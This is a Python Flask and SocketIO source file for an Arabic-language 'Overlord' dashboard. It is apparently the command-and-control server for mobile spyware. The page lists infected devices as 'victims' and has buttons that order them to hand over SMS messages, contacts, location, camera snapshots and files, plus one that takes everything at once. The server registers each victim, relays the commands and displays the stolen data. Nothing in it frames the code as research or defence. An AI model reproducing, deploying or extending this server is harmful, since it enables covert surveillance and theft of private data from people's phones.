import os
import eventlet
eventlet.monkey_patch()

import socket
from flask import Flask, render_template_string, request, jsonify, make_response
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'nexus_zc_overlord'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# =====================================================================
# واجهة NEXUS ZC V2 (Overlord Dashboard)
# =====================================================================
HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS ZC V2 - Overlord</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        :root { --bg: #050000; --panel: #0d0000; --red: #ff0033; --text: #fff; --green: #00ff00; --border: #330000; }
        * { box-sizing: border-box; font-family: 'Share Tech Mono', monospace; margin: 0; padding: 0; }
        body { background: var(--bg); color: var(--text); height: 100vh; display: flex; flex-direction: column; background-image: radial-gradient(circle at 50% 50%, #1a0000 0%, #000 100%); overflow: hidden; }
        
        header { display: flex; justify-content: space-between; padding: 15px; background: var(--panel); border-bottom: 2px solid var(--red); }
        h1 { color: var(--red); font-size: 22px; }
        #status { color: var(--green); font-weight: bold; }
        
        main { display: flex; flex: 1; overflow: hidden; }
        
        /* الشريط الجانبي */
        .sidebar { width: 320px; background: var(--panel); border-left: 1px solid var(--border); padding: 15px; display: flex; flex-direction: column; gap: 10px; overflow-y: auto; }
        .ip-box { background: #000; border: 1px solid var(--green); padding: 15px; text-align: center; color: var(--green); margin-bottom: 10px; }
        .device { padding: 12px; background: #1a0000; border: 1px solid var(--border); cursor: pointer; border-radius: 4px; transition: 0.3s; }
        .device:hover { border-color: var(--red); }
        .device.selected { border-color: var(--red); box-shadow: inset 0 0 10px rgba(255,0,51,0.5); }
        
        /* مساحة العمل */
        .workspace { flex: 1; padding: 20px; display: flex; flex-direction: column; gap: 15px; }
        .terminal { flex: 1; background: #000; border: 1px solid var(--red); padding: 15px; color: var(--green); overflow-y: auto; font-size: 14px; }
        .controls { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
        button { padding: 15px; background: #1a0000; color: var(--red); border: 1px solid var(--red); cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { background: var(--red); color: #000; }
        
        @media (max-width: 768px) {
            main { flex-direction: column; }
            .sidebar { width: 100%; height: 200px; border-left: none; border-bottom: 1px solid var(--border); }
            .controls { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>
    <header><h1>👁️ NEXUS ZC V2 (Overlord)</h1><div id="status">Connecting...</div></header>
    <main>
        <aside class="sidebar">
            <div class="ip-box" id="net-ip">جاري التقاط IP...</div>
            <h3 style="color:var(--red); margin-bottom:10px;">الضحايا (<span id="count">0</span>)</h3>
            <div id="devices"></div>
        </aside>
        <section class="workspace">
            <div class="terminal" id="log">> NEXUS ZC V2 Online.<br>> Exploit Chain Loaded.<br>> Waiting for targets...</div>
            <div class="controls">
                <button onclick="cmd('get_sms')">💬 سحب الرسائل</button>
                <button onclick="cmd('get_contacts')">👥 جهات الاتصال</button>
                <button onclick="cmd('get_location')">📍 الموقع</button>
                <button onclick="cmd('camera_snap')">📸 كاميرا</button>
                <button onclick="cmd('get_files')">📂 سحب الملفات</button>
                <button onclick="cmd('change_wallpaper')">🖼️ تغيير الخلفية</button>
                <button onclick="cmd('vibrate')">📳 اهتزاز</button>
                <button onclick="cmd('exfiltrate_all')" style="grid-column: span 2; color: var(--green); border-color: var(--green);">💀 سحب كل شيء</button>
            </div>
        </section>
    </main>

    <script>
        const socket = io();
        let target = null;
        
        socket.on('connect', () => document.getElementById('status').innerText = "متصل (Overlord)");
        
        socket.on('new_device', () => fetchDevices());
        socket.on('log', msg => {
            const term = document.getElementById('log');
            term.innerHTML += `<br>> ${msg}`;
            term.scrollTop = term.scrollHeight;
        });
        socket.on('client_response', data => {
            const term = document.getElementById('log');
            term.innerHTML += `<br><br><span style="color:#fff;">[+] البيانات المستلمة (${data.command}):</span><br><pre style="color:#00ff00;">${JSON.stringify(data.result, null, 2)}</pre>`;
            term.scrollTop = term.scrollHeight;
        });

        // التقاط IP تلقائياً (WebRTC)
        async function getLocalIP() {
            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            pc.createDataChannel("");
            pc.createOffer(pc.setLocalDescription.bind(pc), () => {});
            pc.onicecandidate = async (ice) => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
                if (myIP && (myIP.includes("192.168.") || myIP.includes("10.") || myIP.includes("172."))) {
                    document.getElementById('net-ip').innerText = `شبكتك: ${myIP}`;
                    pc.onicecandidate = null;
                }
            };
        }
        getLocalIP();

        async function fetchDevices() {
            const res = await fetch('/api/devices');
            const data = await res.json();
            document.getElementById('count').innerText = data.devices.length;
            const list = document.getElementById('devices');
            list.innerHTML = '';
            data.devices.forEach(d => {
                const el = document.createElement('div');
                el.className = 'device';
                el.innerHTML = `<b>${d.model}</b><br><small>${d.id}</small>`;
                el.onclick = () => {
                    document.querySelectorAll('.device').forEach(x => x.classList.remove('selected'));
                    el.classList.add('selected');
                    target = d.id;
                };
                list.appendChild(el);
            });
        }
        setInterval(fetchDevices, 3000);

        function cmd(c) {
            if(!target) return alert('اختر جهاز أولاً');
            let payload = {};
            if(c === 'change_wallpaper') payload.url = prompt("رابط الصورة:");
            socket.emit('command', { targetId: target, command: c, payload });
            document.getElementById('log').innerHTML += `<br>> [*] إرسال أمر: ${c}`;
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML)

# =====================================================================
# إدارة C2
# =====================================================================
clients = {}

@app.route('/api/devices')
def get_devices():
    return jsonify({"devices": [{"id": k, "model": v['info'].get('model', 'Unknown')} for k, v in clients.items()]})

@socketio.on('device_info')
def handle_info(data):
    clients[request.sid] = {"info": data, "sid": request.sid}
    emit('new_device', broadcast=True)
    emit('log', f"[+] ضحية جديدة اتصلت: {data.get('model')}", broadcast=True)

@socketio.on('command')
def handle_cmd(data):
    if data['targetId'] in clients:
        socketio.emit('execute_command', data, room=data['targetId'])
        emit('log', f"[*] إرسال أمر [{data['command']}] إلى {data['targetId']}")

@socketio.on('client_response')
def handle_client_response(data):
    emit('client_response', data, broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in clients: del clients[request.sid]

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port)
